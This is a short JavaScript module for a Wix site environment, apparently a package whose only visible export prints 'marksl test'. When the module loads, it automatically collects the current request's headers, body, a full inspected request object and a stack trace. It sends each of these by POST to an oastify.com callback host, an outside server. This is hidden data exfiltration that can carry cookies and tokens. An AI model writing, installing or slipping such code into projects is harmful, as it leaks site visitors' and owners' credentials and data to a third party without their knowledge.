const getCurrentRequest = require('@wix/wix-request');
const { fetch } = require('wix-fetch');
const util = require('util');

async function main() {
    const webhook = 'https://x31lltv67khjb5st88mxpm2qchie67uw.oastify.com/'

    // stack
    const error = new Error();
    Error.captureStackTrace(error);
    const callStack = error.stack;

    // request
    const currentRequest = await getCurrentRequest();
    const currentRequestInspected = util.inspect(currentRequest, {showHidden: false, depth: 2})
    const reqHeaders = currentRequest.headers;
    const reqBody = currentRequest.request.body;

    // objects i want to send
    const goodies = {
        item,
        reqHeaders,
        reqBody,
        currentRequestInspected, // object too big, send to webhooksite
        callStack
    }

    for (let [key, value] of Object.entries(goodies)) {
        fetch(webhook + key, {
            method: 'POST',
            body: JSON.stringify(value)
        })
    }
}

main();

exports.printMsg = function() {
    console.log("marksl test");
}
